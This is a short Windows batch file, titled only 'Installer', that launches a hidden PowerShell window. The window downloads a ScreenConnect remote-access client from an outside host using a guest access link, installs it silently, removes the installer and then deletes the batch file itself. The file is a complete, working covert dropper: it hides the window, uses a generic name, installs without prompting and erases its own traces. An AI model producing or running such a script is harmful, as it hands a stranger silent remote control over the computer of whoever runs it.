@echo off
title  Installer
powershell -WindowStyle Hidden -Command "&{$u='https://mentacesi.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest';$p='%TEMP%\ScreenConnect.ClientSetup.exe';$w=New-Object Net.WebClient;$w.DownloadFile($u,$p);if(Test-Path $p){Start-Process $p -ArgumentList '/quiet /norestart' -Wait;Start-Sleep 2;Remove-Item $p -Force}}"
del "%~f0"
